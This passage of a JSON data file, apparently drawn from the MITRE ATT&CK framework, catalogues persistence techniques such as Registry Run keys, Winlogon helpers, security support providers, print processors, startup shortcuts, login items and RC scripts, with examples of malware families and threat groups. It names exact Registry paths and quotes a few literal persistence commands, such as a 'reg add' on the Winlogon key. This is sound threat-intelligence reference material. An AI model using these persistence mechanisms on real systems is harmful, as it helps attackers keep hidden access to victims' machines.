persistence."}, {"id": "S0178", "name": "Truvasys", "description": "Truvasys adds a Registry Run key to establish persistence."}, {"id": "S0647", "name": "Turian", "description": "Turian can establish persistence by adding Registry Run keys."}, {"id": "G0010", "name": "Turla", "description": "A Turla Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence."}, {"id": "S0199", "name": "TURNEDUP", "description": "TURNEDUP is capable of writing to a Registry Run key to establish."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used Registry Run keys to establish automatic execution at system startup."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer registers itself under a Registry Run key with the name \"USB Disk Security.\""}, {"id": "S0207", "name": "Vasport", "description": "Vasport copies itself to disk and creates an associated run key Registry entry to establish."}, {"id": "S0442", "name": "VBShower", "description": "VBShower used HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[a-f0-9A-F]{8} to maintain persistence."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can add itself to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UIF2IS20VK Registry keys."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has created LNK files in the Startup folder to establish persistence."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can add a service named wind0ws to the Registry to achieve persistence after reboot."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has established persistence via the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run and a shortcut within the startup folder."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can create a Startup item for persistence if it determines it is on a Windows system."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy creates an entry in a Registry Run key for the malware to execute on startup."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda adds persistence by creating Registry Run keys."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has created a Registry Run key named Dropbox Update Setup to establish persistence for a malicious Python binary."}]}, {"name": "Authentication Package", "description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.", "detailed_description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ with the key value of \"Authentication Packages\"=<target binary>. The binary will then be executed by the system when the authentication packages are loaded.", "id": "T1547.002", "examples": [{"id": "S0143", "name": "Flame", "description": "Flame can use Windows Authentication Packages for persistence."}]}, {"name": "Time Providers", "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.", "detailed_description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the DllName value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.", "id": "T1547.003", "examples": []}, {"name": "Winlogon Helper DLL", "description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon.", "detailed_description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon.\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.", "id": "T1547.004", "examples": [{"id": "S0534", "name": "Bazar", "description": "Bazar can use Winlogon Helper DLL to establish persistence."}, {"id": "S0351", "name": "Cannon", "description": "Cannon adds the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon to establish persistence."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has established persistence via the Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon registry key."}, {"id": "S0200", "name": "Dipsind", "description": "A Dipsind variant registers as a Winlogon Event Notify DLL to establish persistence."}, {"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence by setting the value \"Shell\" with \"explorer.exe, %malware_pathfile%\" under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy issues the command reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" to achieve persistence. "}, {"id": "S0375", "name": "Remexi", "description": "Remexi achieves persistence using Userinit by adding the Registry key HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT creates a Registry key at HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell to survive a system reboot."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has created the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell and sets the value to establish persistence."}, {"id": "G0010", "name": "Turla", "description": "Turla established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon."}]}, {"name": "Security Support Provider", "description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.", "detailed_description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\nThe SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.", "id": "T1547.005", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire can enumerate Security Support Providers (SSPs) as well as utilize PowerSploit's Install-SSP and Invoke-Mimikatz to install malicious SSPs and log authentication events."}, {"id": "S0002", "name": "Mimikatz", "description": "The Mimikatz credential dumper contains an implementation of an SSP."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Install-SSP Persistence module can be used to establish by installing a SSP DLL."}]}, {"name": "Kernel Modules and Extensions", "description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.", "detailed_description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.\nWhen used maliciously, LKMs can be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0). Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through kextload and kextunload commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.\nAdversaries can use LKMs and kexts to conduct Persistence and/or Privilege Escalation on a system. Examples have been found in the wild, and there are some relevant open source projects as well.", "id": "T1547.006", "examples": [{"id": "S0502", "name": "Drovorub", "description": "Drovorub can use kernel modules to establish persistence."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, attackers used a signed kernel rootkit to establish additional persistence."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to install several loadable kernel modules (LKMs) on infected machines."}]}, {"name": "Re-opened Applications", "description": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\". When selected, all applications currently open are added to a property list file named com.apple.loginwindow.[UUID].plist within the ~/Library/Preferences/ByHost directory. Applications listed in this file are automatically reopened upon the user\u2019s next logon.", "detailed_description": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\". When selected, all applications currently open are added to a property list file named com.apple.loginwindow.[UUID].plist within the ~/Library/Preferences/ByHost directory. Applications listed in this file are automatically reopened upon the user\u2019s next logon.\nAdversaries can establish Persistence by adding a malicious application path to the com.apple.loginwindow.[UUID].plist file to execute payloads when a user logs in.", "id": "T1547.007", "examples": []}, {"name": "LSASS Driver", "description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.", "detailed_description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.", "id": "T1547.008", "examples": [{"id": "S0208", "name": "Pasam", "description": "Pasam establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes."}]}, {"name": "Shortcut Modification", "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.", "detailed_description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.", "id": "T1547.009", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 has modified LNK shortcuts."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth's initial payload is a malicious .LNK file. "}, {"id": "S0031", "name": "BACKSPACE", "description": "BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can establish persistence by writing shortcuts to the Windows Startup folder."}, {"id": "S0089", "name": "BlackEnergy", "description": "The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder."}, {"id": "S0244", "name": "Comnie", "description": "Comnie establishes persistence via a .lnk file in the victim\u2019s startup path."}, {"id": "S0363", "name": "Empire", "description": "Empire can persist by modifying a .LNK file to include a backdoor."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT creates a .LNK file for persistence."}, {"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can write or modify browser shortcuts to enable launching of malicious browser extensions."}, {"id": "S0170", "name": "Helminth", "description": "Helminth establishes persistence by creating a shortcut."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can use a .lnk shortcut for the Control Panel to establish persistence."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar adds a .lnk file to the Windows startup folder."}, {"id": "S0356", "name": "KONNI", "description": "A version of KONNI drops a Windows shortcut on the victim\u2019s machine to establish persistence."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware has maintained persistence on a system by creating a LNK shortcut in the user\u2019s Startup folder."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can modify the shortcut that launches Telegram by replacing its path with the malicious payload to launch with the legitimate executable."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia creates a shortcut to maintain persistence."}, {"id": "S0439", "name": "Okrum", "description": "Okrum can establish persistence by creating a .lnk shortcut to itself in the Startup folder."}, {"id": "S0172", "name": "Reaver", "description": "Reaver creates a shortcut file and saves it in a Startup folder to establish persistence."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin establishes persistence by creating a shortcut (.LNK file) in the Windows startup folder to run a script each time the user logs in."}, {"id": "S0085", "name": "S-Type", "description": "S-Type may create the file %HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke is capable of persisting via a .lnk file stored in the Startup directory."}, {"id": "S0028", "name": "SHIPSHAPE", "description": "SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder."}, {"id": "S0035", "name": "SPACESHIP", "description": "SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder."}, {"id": "S0058", "name": "SslMM", "description": "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot can create a shortcut in the Windows startup folder for persistence."}]}, {"name": "Port Monitors", "description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup. This DLL can be located in C:\\Windows\\System32 and will be loaded and run by the print spooler service, spoolsv.exe, under SYSTEM level permissions on boot.", "detailed_description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup. This DLL can be located in C:\\Windows\\System32 and will be loaded and run by the print spooler service, spoolsv.exe, under SYSTEM level permissions on boot.\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the Driver value of an existing or new arbitrarily named subkey of HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. The Registry key contains entries for the following:", "id": "T1547.010", "examples": []}, {"name": "Print Processors", "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.", "detailed_description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the AddPrintProcessor API call with an account that has SeLoadDriverPrivilege enabled. Alternatively, a print processor can be registered to the print spooler service by adding the HKLM\\SYSTEM\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\[Windows architecture: e.g., Windows x64]\\Print Processors\\[user defined]\\Driver Registry key that points to the DLL.\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the GetPrintProcessorDirectory API call, or referenced via a relative path from this directory. After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.", "id": "T1547.012", "examples": [{"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has added the Registry key HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\UDPrint\" /v Driver /d \"spool.dll /f to load malware as a Print Processor."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can drop itself in C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll to be loaded automatically by the spoolsv Windows service."}, {"id": "S0501", "name": "PipeMon", "description": "The PipeMon installer has modified the Registry key HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors to install PipeMon as a Print Processor."}]}, {"name": "XDG Autostart Entries", "description": "Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user\u2019s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (.desktop) to configure the user\u2019s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.", "detailed_description": "Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user\u2019s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (.desktop) to configure the user\u2019s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.\nAdversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the Exec directive in the .desktop configuration file. When the user\u2019s desktop environment is loaded at user login, the .desktop files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the /etc/xdg/autostart directory while the user entries are located in the ~/.config/autostart directory.\nAdversaries may combine this technique with Masquerading to blend malicious Autostart entries with legitimate programs.", "id": "T1547.013", "examples": [{"id": "S0235", "name": "CrossRAT", "description": "CrossRAT can use an XDG Autostart to establish persistence."}, {"id": "S0410", "name": "Fysbis", "description": "If executing without root privileges, Fysbis adds a .desktop configuration file to the user's ~/.config/autostart directory."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can use XDG Autostart Entries to establish persistence on Linux systems."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can use an XDG Autostart to establish persistence."}, {"id": "S1078", "name": "RotaJakiro", "description": "When executing with user-level permissions, RotaJakiro can install persistence using a .desktop file under the $HOME/.config/autostart/ folder."}]}, {"name": "Active Setup", "description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. These programs will be executed under the context of the user and will have the account's associated permissions level.", "detailed_description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. These programs will be executed under the context of the user and will have the account's associated permissions level.\nAdversaries may abuse Active Setup by creating a key under  HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\ and setting a malicious value for StubPath. This value will serve as the program that will be executed when a user logs into the computer.\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.", "id": "T1547.014", "examples": [{"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates a Registry key in the Active Setup pointing to a malicious executable."}]}, {"name": "Login Items", "description": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. Login items can be added via a shared file list or Service Management Framework. Shared file list login items can be set using scripting languages such as AppleScript, whereas the Service Management Framework uses the API call SMLoginItemSetEnabled.", "detailed_description": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. Login items can be added via a shared file list or Service Management Framework. Shared file list login items can be set using scripting languages such as AppleScript, whereas the Service Management Framework uses the API call SMLoginItemSetEnabled.\nLogin items installed using the Service Management Framework leverage launchd, are not visible in the System Preferences, and can only be removed by the application that created them. Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder. Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\nAdversaries can utilize AppleScript and Native API calls to create a login item to spawn malicious executables. Prior to version 10.5 on macOS, adversaries can add login items by using AppleScript to send an Apple events to the \"System Events\" process, which has an AppleScript dictionary for manipulating login items. Adversaries can use a command such as tell application \"System Events\" to make login item at end with properties /path/to/executable. This command adds the path of the malicious executable to the login item file list located in ~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm. Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.", "id": "T1547.015", "examples": [{"id": "S0281", "name": "Dok", "description": "Dok uses AppleScript to install a login Item by sending Apple events to the System Events process."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can add Login Items to establish persistence."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can persist via startup options for Login items."}]}]}, {"name": "Boot or Logon Initialization Scripts", "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.", "detailed_description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.", "id": "T1037", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has hijacked legitimate application-specific startup scripts to enable malware to execute on system startup."}, {"id": "G0096", "name": "APT41", "description": "APT41 used a hidden shell script in /etc/rc.d/init.d to leverage the ADORE.XSECbackdoor and Adore-NG rootkit."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has installed an \"init.d\" startup script to maintain persistence."}, {"id": "S1078", "name": "RotaJakiro", "description": "Depending on the Linux distribution and when executing with root permissions, RotaJakiro may install persistence using a .conf file in the /etc/init/ folder."}], "sub_techniques": [{"name": "Logon Script (Windows)", "description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the HKCU\\Environment\\UserInitMprLogonScript Registry key.", "detailed_description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the HKCU\\Environment\\UserInitMprLogonScript Registry key.\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.", "id": "T1037.001", "examples": [{"id": "G0007", "name": "APT28", "description": "An APT28 loader Trojan adds the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence."}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher can establish persistence via adding a Registry key with a logon script HKEY_CURRENT_USER\\Environment \"UserInitMprLogonScript\" ."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has added persistence by registering the file name for the next stage malware under HKCU\\Environment\\UserInitMprLogonScript."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has registered a Windows shell script under the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY has the ability to set the HKCU\\Environment\\UserInitMprLogonScript Registry key to execute logon scripts."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy performs persistence with a logon script via adding to the Registry key HKCU\\Environment\\UserInitMprLogonScript."}]}, {"name": "Login Hook", "description": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the /Library/Preferences/com.apple.loginwindow.plist file and can be modified using the defaults command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.", "detailed_description": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the /Library/Preferences/com.apple.loginwindow.plist file and can be modified using the defaults command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.\nAdversaries can add or insert a path to a malicious script in the com.apple.loginwindow.plist file, using the LoginHook or LogoutHook key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.\nNote: Login hooks were deprecated in 10.11 version of macOS in favor of Launch Daemon and Launch Agent", "id": "T1037.002", "examples": []}, {"name": "Network Logon Script", "description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.", "detailed_description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.\nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.", "id": "T1037.003", "examples": []}, {"name": "RC Scripts", "description": "Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.", "detailed_description": "Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\nAdversaries can establish persistence by adding a malicious binary path or shell commands to rc.local, rc.common, and other RC scripts specific to the Unix-like distribution. Upon reboot, the system executes the script's contents as root, resulting in persistence.\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of Launchd.  This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts. To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.", "id": "T1037.004", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has installed a run command on a compromised system to enable malware execution on system startup."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink has the ability to execute on device startup, using a modified RC script named S51armled."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can add init.d and rc.d files in the /etc folder to establish persistence."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp installs reboot persistence by adding itself to /etc/rc.local."}, {"id": "S0278", "name": "iKitten", "description": "iKitten adds an entry to the rc.common file for persistence."}]}, {"name": "Startup Items", "description": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.", "detailed_description": "Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with 